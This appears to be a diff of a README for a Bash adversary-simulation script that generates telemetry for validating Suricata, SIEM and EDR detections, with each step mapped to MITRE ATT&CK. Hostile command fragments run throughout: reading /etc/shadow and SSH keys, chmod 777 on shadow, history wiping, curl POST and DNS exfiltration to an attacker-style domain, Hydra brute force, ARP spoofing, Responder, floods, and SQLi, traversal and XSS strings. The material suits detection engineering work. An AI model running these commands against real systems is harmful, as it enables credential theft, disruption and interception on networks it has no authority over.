@@ -1,211 +1,617 @@
-# ⚔️ Attack Simulation & Detection Validation Engine (aler.sh)
+# ⚔️ Network Traffic & Detection Validation Script
 
-## Overview
-
-The **Attack Simulation & Detection Validation Engine (`aler.sh`)** is a comprehensive Linux-based security testing and telemetry generation script designed for **SOC detection engineering and MITRE ATT&CK simulation in a controlled lab environment**.
-
-It simulates real-world adversary behaviors such as reconnaissance, exploitation attempts, lateral movement, credential attacks, and network flooding — while generating **high-volume telemetry for IDS/IPS validation (Suricata)**.
-
-> ⚠️ This project is strictly for **educational and defensive cybersecurity research purposes only** in isolated lab environments.
+> A Linux-based network telemetry and adversary simulation script designed to generate observable security events for IDS/IPS, SIEM, EDR, and network monitoring validation.
 
 ---
 
-## 🎯 Objective
+# 📌 Overview
 
-The main goals of this engine are:
+This Bash script automates:
 
-- Simulate attacker behaviors in a controlled environment  
-- Generate realistic network telemetry for IDS testing  
-- Validate Suricata rules mapped to MITRE ATT&CK techniques  
-- Support SOC detection engineering learning  
-- Understand alert generation and security monitoring workflows  
+* Network discovery
+* Traffic generation
+* Service interaction
+* Protocol testing
+* Detection trigger simulation
+* MITRE ATT&CK–mapped behaviors
+* Security tool validation
 
----
-
-## 🧠 Key Capabilities
-
-### 🟢 System & Network Intelligence
-- Root privilege validation
-- Interface, IP, gateway, and public IP detection
-- Network status classification (LAN / Loopback / Public)
-- WiFi detection awareness
+The script generates telemetry across multiple protocols and system activities to help validate monitoring visibility and detection rules.
 
 ---
 
-### 🔧 Environment Setup & Tooling
-Automatically installs and validates security tools:
+# ⚠️ Warning
 
-- nmap
-- hping3
-- hydra
-- netcat (nc)
-- socat
-- nikto
-- sqlmap
-- crunch
-- bettercap
-- responder
-- smbclient
-- snmp tools
+This script performs:
 
-Also initializes system services:
+* Port scanning
+* Flood traffic generation
+* Brute-force simulations
+* ARP spoofing
+* MITM-related activity
+* Vulnerability scanning
+* Credential-access simulation
 
-- Apache2
-- SSH
-- SMB (Samba)
-- SNMP
+Run only in:
+
+* Authorized lab environments
+* Test networks
+* Isolated virtual machines
+
+Do not run on production or unauthorized systems.
 
 ---
 
-### 🌐 Reconnaissance Simulation (MITRE T1595)
-- ICMP sweeps (ping flood simulation)
-- Nmap scanning:
-  - SYN scan
-  - Full port scan
-  - NSE vulnerability scripts
-  - Service detection (-sV)
-- DNS enumeration
-- SNMP walk probing
+# ⚙️ Script Workflow
 
 ---
 
-### 💣 Exploitation & Attack Simulation
+# 1️⃣ Root Privilege Check
 
-#### 🔹 Web Attacks
-- SQL Injection simulation
-- Path traversal attempts
-- XSS payload encoding tests
-- HTTP header fuzzing
-- Banner grabbing
+The script verifies that it is executed with root privileges.
 
-#### 🔹 Network Attacks
-- TCP flood simulation
-- UDP flood simulation
-- SYN flood (hping3)
-- Xmas scan packets
-- DNS flood simulation
-
-#### 🔹 Payload Delivery Simulation
-- Base64 encoded exfiltration attempts
-- EICAR test string transmission
-- Large payload streaming via netcat
-
----
-
-### 🔐 Credential Access Simulation (MITRE T1110)
-- Hydra brute-force attacks:
-  - SSH
-  - SMB
-  - Multi-port authentication testing
-- Password spraying simulation
-- External target discovery + attack chaining
-
----
-
-### 🧬 Lateral Movement & MITM Simulation
-- ARP spoofing (arpspoof)
-- Responder LLMNR/NBT-NS poisoning
-- Bettercap-based dynamic target rotation
-- Multi-host ARP spoof automation
-
----
-
-### 📡 Network Traffic Generation Engine
-Generates high-volume telemetry:
-
-- ICMP noise generation
-- SMB enumeration attempts
-- HTTP request floods
-- Connection bursts (nc / curl / ssh)
-- Netstat / ss / lsof system enumeration
-
----
-
-### 📤 Data Exfiltration Simulation (MITRE T1041)
-- Fake credential exfiltration via HTTP POST
-- Encoded payload transmission
-- Large file download simulation
-- External HTTP beaconing (httpbin / test servers)
-
----
-
-### 🧪 IDS / SIEM Validation Focus
-Designed specifically to trigger and validate:
-
-- Suricata IDS rules
-- MITRE ATT&CK mappings
-- SOC alert pipelines
-- Network anomaly detection systems
-
----
-
-## 🧩 MITRE ATT&CK Coverage
-
-| Technique ID | Technique Name |
-|--------------|----------------|
-| T1595 | Active Scanning |
-| T1046 | Network Service Discovery |
-| T1110 | Brute Force |
-| T1059 | Command & Scripting Interpreter |
-| T1105 | Ingress Tool Transfer |
-| T1041 | Exfiltration Over Network |
-| T1557 | Adversary-in-the-Middle |
-
----
-
-## 📁 Project Flow
-
-```bash
-1. System Initialization
-2. Network Discovery
-3. Tool Installation
-4. Service Setup
-5. Traffic & Telemetry Generation
-6. Attack Simulation (Multi-stage)
-7. Detection Rule Triggering (Suricata)
-8. Cleanup & Environment Reset
+```bash id="6v0h1t"
+if [[ $EUID -ne 0 ]]; then
+    echo "[!] Run as root"
+    exit 1
+fi
 ```
-## 🧪 Cleanup & Safety Controls
 
-At the end of execution, the script automatically:
+---
 
-- Terminates background attack processes
-- Stops responder, bettercap, hydra, hping3, etc.
-- Removes temporary files and logs
-- Clears downloaded artifacts
-- Resets networking services
-- Stops lab services (SMB, SNMP)
-- Kills open sockets and listeners
-## ⚙️ Requirements
-- Linux (Debian/Ubuntu recommended)
-- Root privileges
-- Suricata IDS (for detection validation)
-- Isolated lab network (VERY IMPORTANT)
-## 🚨 Ethical Notice
+# 2️⃣ Network Detection
 
-This script:
+The script automatically detects:
 
-- ❌ Must NOT be used on real networks
-- ❌ Must NOT target unauthorized systems
-- ❌ Must NOT be used for offensive activity outside lab
-- ✅ Intended only for cybersecurity education & SOC training
-## 📊 Learning Outcomes
+* Active network interface
+* Local IP address
+* Gateway
+* Public IP
 
-By using this engine, you gain experience in:
+Example:
 
-- SOC detection engineering
-- Network telemetry analysis
-- IDS rule validation
-- MITRE ATT&CK mapping
-- Adversary simulation modeling
-- Linux-based security tooling
-- Threat hunting fundamentals
-## 🧠 Author Notes
+```bash id="i4fq3h"
+INTERFACE=$(ip -o -4 route show to default | awk '{print $5}')
+LOCAL_IP=$(ip -4 addr show "$INTERFACE")
+GATEWAY=$(ip route | awk '/default/ {print $3}')
+```
 
-This project was built as a blue-team focused adversary simulation lab, helping bridge the gap between:
+---
 
-Attack simulation ↔ Detection engineering ↔ SOC operations
+# 3️⃣ Network Status Analysis
 
-## 🏁 Conclusion
+The script identifies whether the system is using:
 
-This engine demonstrates a full-cycle attack simulation and detection validation pipeline
+* Loopback
+* Private LAN
+* Public Interface
+
+---
+
+# 4️⃣ Automatic Dependency Installation
+
+The script checks and installs required tools.
+
+## Installed Tools
+
+```bash id="zax6q9"
+nmap
+hping3
+hydra
+bettercap
+sqlmap
+nikto
+crunch
+responder
+snmpwalk
+smbclient
+sipp
+socat
+openssl
+```
+
+---
+
+# 5️⃣ Service Initialization
+
+The script enables and starts:
+
+```bash id="4d7fml"
+apache2
+ssh
+snmpd
+smbd
+```
+
+---
+
+# 6️⃣ URL List Preparation
+
+A file named `type` is created containing multiple HTTP/HTTPS targets.
+
+Example:
+
+```bash id="3r8lfe"
+http://testmynids.org/uid/index.html
+https://102.130.113.30
+```
+
+---
+
+# 7️⃣ HTTP / HTTPS Traffic Generation
+
+The script generates:
+
+* HTTP requests
+* HTTPS requests
+* SQLMap-style User-Agent requests
+* File download attempts
+
+Example:
+
+```bash id="mj7k1w"
+curl -A "sqlmap/1.0"
+```
+
+---
+
+# 8️⃣ DNS Traffic Generation
+
+The script generates DNS activity using:
+
+* `nslookup`
+* `dig`
+
+Including randomized domains.
+
+Example:
+
+```bash id="r2cn3e"
+nslookup random1234.test
+```
+
+---
+
+# 9️⃣ SSL/TLS Handshake Simulation
+
+The script uses OpenSSL to simulate TLS connections.
+
+Example:
+
+```bash id="e0q6na"
+openssl s_client -connect google.com:443
+```
+
+---
+
+# 🔟 Port Checking
+
+The script checks common ports on the gateway:
+
+```bash id="7lpwq8"
+21 22 23 25 53 80 110 139 143 443 445 3306 3389 8080
+```
+
+Using:
+
+```bash id="mf7xqy"
+nc -z
+```
+
+---
+
+# 1️⃣1️⃣ SMTP / IMAP Simulation
+
+The script simulates:
+
+* SMTP connections
+* IMAP logout traffic
+
+Example:
+
+```bash id="cw8r5m"
+echo QUIT | nc smtp.gmail.com 587
+```
+
+---
+
+# 1️⃣2️⃣ SMB Enumeration
+
+The script performs SMB share enumeration using:
+
+```bash id="5yod2s"
+smbclient -L
+```
+
+---
+
+# 1️⃣3️⃣ Network Statistics Collection
+
+The script collects connection data using:
+
+```bash id="3j8qdp"
+ss -antp
+netstat -ant
+```
+
+---
+
+# 1️⃣4️⃣ SQLMap Execution
+
+The script launches automated SQLMap scans against:
+
+* Local targets
+* URLs from the target file
+
+Example:
+
+```bash id="kg0x7s"
+sqlmap -u "$url"
+```
+
+---
+
+# 1️⃣5️⃣ Network Service Discovery
+
+The script performs service discovery against gateway ports.
+
+Mapped Technique:
+
+| Technique | Description               |
+| --------- | ------------------------- |
+| T1046     | Network Service Discovery |
+
+---
+
+# 1️⃣6️⃣ SSH Remote Service Simulation
+
+The script attempts SSH connections to a target node.
+
+Example:
+
+```bash id="ql4s1k"
+ssh fakeuser@"$TARGET_NODE"
+```
+
+Mapped Technique:
+
+| Technique | Description         |
+| --------- | ------------------- |
+| T1021.004 | SSH Remote Services |
+
+---
+
+# 1️⃣7️⃣ Application Layer Protocol Simulation
+
+The script generates repeated web requests using `curl`.
+
+Example:
+
+```bash id="s0i9w2"
+curl -A "Mozilla/5.0 (C2-Emulator)"
+```
+
+Mapped Technique:
+
+| Technique | Description                |
+| --------- | -------------------------- |
+| T1071.001 | Application Layer Protocol |
+
+---
+
+# 1️⃣8️⃣ Data Exfiltration Simulation
+
+The script sends Base64-encoded data using HTTP POST requests.
+
+Example:
+
+```bash id="ob6g4n"
+curl -X POST -d "data=$DATA_TO_EXFIL"
+```
+
+Mapped Technique:
+
+| Technique | Description                            |
+| --------- | -------------------------------------- |
+| T1048     | Exfiltration Over Alternative Protocol |
+
+---
+
+# 1️⃣9️⃣ Discovery Commands
+
+The script executes:
+
+```bash id="1xzq6n"
+whoami
+id
+uname -a
+ip addr
+route -n
+cat /etc/passwd
+```
+
+Mapped Techniques:
+
+| Technique | Description                  |
+| --------- | ---------------------------- |
+| T1082     | System Information Discovery |
+| T1033     | System Owner/User Discovery  |
+| T1016     | Network Discovery            |
+| T1087     | Account Discovery            |
+
+---
+
+# 2️⃣0️⃣ Credential Access Simulation
+
+The script accesses:
+
+```bash id="6ntr4v"
+cat /etc/shadow
+ls -la ~/.ssh/
+```
+
+Mapped Technique:
+
+| Technique | Description           |
+| --------- | --------------------- |
+| T1003.008 | OS Credential Dumping |
+
+---
+
+# 2️⃣1️⃣ Persistence Simulation
+
+The script creates:
+
+* Cron jobs
+* Bash configuration modifications
+
+Examples:
+
+```bash id="w7g4ke"
+echo "* * * * * root ..."
+echo "alias ls='ls -la'" >> ~/.bashrc
+```
+
+Mapped Technique:
+
+| Technique | Description                           |
+| --------- | ------------------------------------- |
+| T1546.004 | Unix Shell Configuration Modification |
+
+---
+
+# 2️⃣2️⃣ Defense Evasion Simulation
+
+The script performs:
+
+```bash id="m3f2yx"
+history -c
+rm -f ~/.bash_history
+chmod 777 /etc/shadow
+```
+
+Mapped Techniques:
+
+| Technique | Description                  |
+| --------- | ---------------------------- |
+| T1070.002 | Clear Linux Logs             |
+| T1222.002 | File Permission Modification |
+
+---
+
+# 2️⃣3️⃣ DNS Exfiltration Simulation
+
+The script generates DNS queries:
+
+```bash id="6d1jcu"
+nslookup attacker-controlled-domain.com
+```
+
+Mapped Technique:
+
+| Technique | Description                            |
+| --------- | -------------------------------------- |
+| T1011     | Exfiltration Over Other Network Medium |
+
+---
+
+# 2️⃣4️⃣ Proxy / Tunnel Simulation
+
+The script launches:
+
+```bash id="5yzk6r"
+ssh -D 1080 -N localhost
+```
+
+Mapped Technique:
+
+| Technique | Description |
+| --------- | ----------- |
+| T1090     | Proxy       |
+
+---
+
+# 2️⃣5️⃣ Timestomping Simulation
+
+The script modifies timestamps on dummy files.
+
+Example:
+
+```bash id="tf4o2q"
+touch -a -m -t 202301010101.01
+```
+
+Mapped Technique:
+
+| Technique | Description  |
+| --------- | ------------ |
+| T1070.006 | Timestomping |
+
+---
+
+# 2️⃣6️⃣ Reconnaissance & Vulnerability Scanning
+
+The script performs:
+
+```bash id="2qg7fh"
+nmap --script vuln
+nikto -h
+```
+
+Mapped Technique:
+
+| Technique | Description            |
+| --------- | ---------------------- |
+| T1595.002 | Vulnerability Scanning |
+
+---
+
+# 2️⃣7️⃣ Flood Traffic Generation
+
+The script generates:
+
+* SYN flood traffic
+* UDP flood traffic
+* ICMP flood traffic
+* Xmas flood traffic
+
+Using:
+
+```bash id="9n7v3m"
+hping3
+ping -f
+```
+
+---
+
+# 2️⃣8️⃣ Payload & Injection Simulations
+
+The script sends:
+
+* SQL injection patterns
+* Path traversal patterns
+* Script injection strings
+* EICAR test string
+
+Examples:
+
+```bash id="9v7a2e"
+' OR 1=1 --
+../../etc/passwd
+<script>alert()</script>
+```
+
+---
+
+# 2️⃣9️⃣ Brute Force Simulation
+
+The script launches Hydra against:
+
+* SSH
+* SMB
+
+Example:
+
+```bash id="8c2slo"
+hydra -l root -P wordlist ssh://target
+```
+
+Mapped Technique:
+
+| Technique | Description |
+| --------- | ----------- |
+| T1110     | Brute Force |
+
+---
+
+# 3️⃣0️⃣ Adversary-in-the-Middle Simulation
+
+The script launches:
+
+* Responder
+* ARP spoofing
+* Bettercap
+
+Examples:
+
+```bash id="q6e2xf"
+responder -I
+arpspoof
+bettercap
+```
+
+Mapped Technique:
+
+| Technique | Description             |
+| --------- | ----------------------- |
+| T1557     | Adversary-in-the-Middle |
+
+---
+
+# 📡 Protocols Generated
+
+The script generates telemetry for:
+
+* HTTP
+* HTTPS
+* DNS
+* SMTP
+* IMAP
+* SMB
+* SSH
+* SIP
+* DHCP
+* SNMP
+* ICMP
+* TCP
+* UDP
+
+---
+
+# 🧪 Security Tool Validation
+
+The script can generate telemetry useful for validating:
+
+| Tool           | Validation Type       |
+| -------------- | --------------------- |
+| Suricata       | IDS alerts            |
+| Zeek           | Network visibility    |
+| Wazuh          | Host-based alerts     |
+| Splunk         | SIEM correlation      |
+| Elastic SIEM   | Detection engineering |
+| Security Onion | SOC monitoring        |
+
+---
+
+# 🚀 Execution
+
+```bash id="9d5w6g"
+chmod +x script.sh
+sudo ./script.sh
+```
+
+---
+
+
+
+---
+
+# 🔐 Safety Recommendations
+
+* Use isolated virtual machines
+* Run inside a lab network
+* Monitor traffic using IDS/IPS
+* Avoid production environments
+
+---
+
+# 📜 License
+
+For:
+
+* Detection engineering
+* SOC testing
+* Security research
+* Educational lab usage
+
+Use responsibly and only in authorized environments.
